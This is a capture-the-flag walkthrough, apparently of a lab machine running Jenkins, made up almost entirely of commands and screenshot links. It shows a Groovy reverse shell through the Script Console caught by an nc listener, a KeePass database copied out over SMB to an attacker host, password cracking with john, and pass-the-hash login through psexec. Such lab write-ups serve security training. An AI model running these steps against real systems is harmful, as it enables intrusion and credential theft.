```
nmap -sS -sC -sV -T5 -Pn 10.10.10.63
```
![image](https://github.com/user-attachments/assets/d6384270-9642-4d95-8b0d-c23bf27eaf3a)

```
10.10.10.63
Input '
```
![image](https://github.com/user-attachments/assets/a59fd11c-2e7e-4193-97be-a5a9b13ed805)

![image](https://github.com/user-attachments/assets/7e80e98a-f388-475c-8b61-e671824c2fb0)

```
http://10.10.10.63:50000/
Jetty 9.4.z-SNAPSHOT
```
![image](https://github.com/user-attachments/assets/edbcca3b-a396-4ed8-bd71-7b0cb86b4607)

```
http://10.10.10.63:50000/askjeeves/
```
![image](https://github.com/user-attachments/assets/08705629-c3d3-46d2-ac60-839ceef69656)


```
Script Console
https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76#file-revsh-groovy
```
![image](https://github.com/user-attachments/assets/35f56ef6-df64-4a95-8847-53854f95cf57)

```
nc -lnvp 1234
```
![image](https://github.com/user-attachments/assets/36aa2208-bd91-4886-b4a9-834abddf346a)

![image](https://github.com/user-attachments/assets/b067c379-eaa2-43f3-bdd2-a654d79c9eb1)

```
C:\Users\kohsuke\Documents - CEH.kdbx
./smbserver.py s . -smb2support -username df -password df
net use \\10.10.14.6\s /u:df df
copy CEH.kdbx \\10.10.14.6\s\CEH.kdbx
```
![image](https://github.com/user-attachments/assets/c80afcce-8d01-4a0f-b4b9-7b9881b5c8d7)

![image](https://github.com/user-attachments/assets/4450ba19-f687-4b53-a5b6-2a13c816c165)

![image](https://github.com/user-attachments/assets/61661a41-6c09-4cf4-9cef-62c3889a1d1c)

```
keepass2john CEH.kdbx > hash.txt
john hash.txt -w=/usr/share/wordlists/rockyou.txt
```
![image](https://github.com/user-attachments/assets/59eedc8b-b643-435e-bcec-24efd25f5d0a)

![image](https://github.com/user-attachments/assets/7c1bc45a-b0a3-4b41-b509-95977780944c)

```
keepassxc
```
![image](https://github.com/user-attachments/assets/3f1639bd-593e-4a72-a92b-1b771d06e14b)

```
Backup stuff
./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.10.10.63
```
![image](https://github.com/user-attachments/assets/afbdc1a8-095d-4e29-ac10-53b2aa0f5635)

![image](https://github.com/user-attachments/assets/87035c2e-6539-461d-bbfc-34a28489f536)

```
dir /r
powershell Get-Content -Path "hm.txt" -Stream "root.txt"
```
![image](https://github.com/user-attachments/assets/879b5159-06d8-4205-b90e-1d5aa938fd07)
